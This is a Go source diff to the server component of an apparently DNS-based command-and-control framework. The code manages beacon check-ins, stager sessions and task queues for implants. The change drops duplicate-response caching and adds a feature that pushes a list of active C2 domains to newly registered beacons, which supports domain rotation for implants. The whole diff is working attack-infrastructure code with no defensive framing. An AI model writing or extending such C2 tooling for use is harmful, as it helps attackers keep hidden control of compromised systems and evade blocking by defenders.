@@ -91,7 +91,7 @@ type C2Manager struct {
 	stagerSessions       map[string]*StagerSession       // key: clientIP
 	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
 	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
-	cachedResponses      map[string]string               // key: message hash, value: cached response (for duplicates)
+	knownDomains         []string                        // Active DNS domains from Master (for first check-in)
 	db                   *Database                       // Database for persistent storage
 	mutex                sync.RWMutex
 	taskCounter          int
@@ -136,7 +136,6 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		stagerSessions:       make(map[string]*StagerSession),
 		cachedStagerSessions: make(map[string]*CachedStagerSession),
 		recentMessages:       make(map[string]time.Time),
-		cachedResponses:      make(map[string]string),
 		db:                   db,
 		taskCounter:          TaskCounterStart,
 		debug:                debug,
@@ -444,7 +443,6 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 		for msgHash, timestamp := range c2.recentMessages {
 			if now.Sub(timestamp) > 5*time.Minute {
 				delete(c2.recentMessages, msgHash)
-				delete(c2.cachedResponses, msgHash) // Also clean cached responses
 				expiredCount++
 			}
 		}
@@ -776,34 +774,19 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		return "", false
 	}
 
-	// Check for duplicate messages (DNS retries) - hash the content
+	// Check for duplicate messages (DNS retries) - hash the content for logging only
 	msgHash := fmt.Sprintf("%x", sha256.Sum256([]byte(decoded)))
 	isDuplicate := false
 
-	// Extract message type FIRST to determine if caching applies
+	// Extract message type FIRST
 	messageType := strings.SplitN(decoded, "|", 2)[0]
 
 	c2.mutex.Lock()
 	if lastSeen, exists := c2.recentMessages[msgHash]; exists {
 		isDuplicate = true
-		// IMPORTANT: Don't use cached responses for CHK/CHECKIN - task queues are dynamic
-		if messageType != "CHK" && messageType != "CHECKIN" {
-			// Check if we have a cached response for this duplicate
-			if cachedResp, hasCached := c2.cachedResponses[msgHash]; hasCached {
-				c2.mutex.Unlock()
-				if c2.debug {
-					logf("[DEBUG] Duplicate message detected (seen %v ago), returning cached response", time.Since(lastSeen))
-				}
-				return cachedResp, true
-			}
-		}
 		c2.mutex.Unlock()
 		if c2.debug {
-			if messageType == "CHK" || messageType == "CHECKIN" {
-				logf("[DEBUG] Duplicate CHK detected (seen %v ago), but processing fresh for task queue check", time.Since(lastSeen))
-			} else {
-				logf("[DEBUG] Duplicate message detected (seen %v ago)", time.Since(lastSeen))
-			}
+			logf("[DEBUG] Duplicate message detected (seen %v ago), processing anyway", time.Since(lastSeen))
 		}
 	} else {
 		// Mark new message as seen
@@ -886,17 +869,6 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			logf("[DEBUG] Unknown message type: %s", messageType)
 		}
 		return "", false
-	}
-
-	// Cache the response for duplicate handling (only if not a duplicate itself)
-	// IMPORTANT: Don't cache CHK/CHECKIN responses - task queues are dynamic
-	if validMessage && !isDuplicate && response != "" && messageType != "CHK" && messageType != "CHECKIN" {
-		c2.mutex.Lock()
-		c2.cachedResponses[msgHash] = response
-		c2.mutex.Unlock()
-		if c2.debug {
-			logf("[DEBUG] Cached response for message hash: %s", msgHash[:16])
-		}
 	}
 
 	return response, validMessage
@@ -1051,6 +1023,18 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 		return taskResponse
 	}
 	c2.mutex.Unlock()
+
+	// For new beacons (first check-in), send domain list if available
+	if !exists {
+		domains := c2.GetKnownDomains()
+		if len(domains) > 0 {
+			domainList := strings.Join(domains, ",")
+			if c2.debug {
+				logf("[C2] Sending domain list to new beacon %s: %v", beaconID, domains)
+			}
+			return fmt.Sprintf("DOMAINS|%s", domainList)
+		}
+	}
 
 	return "ACK" // No tasks available
 }
@@ -1907,6 +1891,26 @@ func (c2 *C2Manager) GetBeacons() map[string]*Beacon {
 	for id, beacon := range c2.beacons {
 		result[id] = beacon
 	}
+	return result
+}
+
+// SetKnownDomains updates the list of known active DNS domains from Master
+func (c2 *C2Manager) SetKnownDomains(domains []string) {
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+	c2.knownDomains = domains
+	if c2.debug {
+		logf("[C2] Updated known domains: %v", domains)
+	}
+}
+
+// GetKnownDomains returns the list of known active DNS domains
+func (c2 *C2Manager) GetKnownDomains() []string {
+	c2.mutex.RLock()
+	defer c2.mutex.RUnlock()
+	// Return a copy to prevent external modification
+	result := make([]string, len(c2.knownDomains))
+	copy(result, c2.knownDomains)
 	return result
 }
 
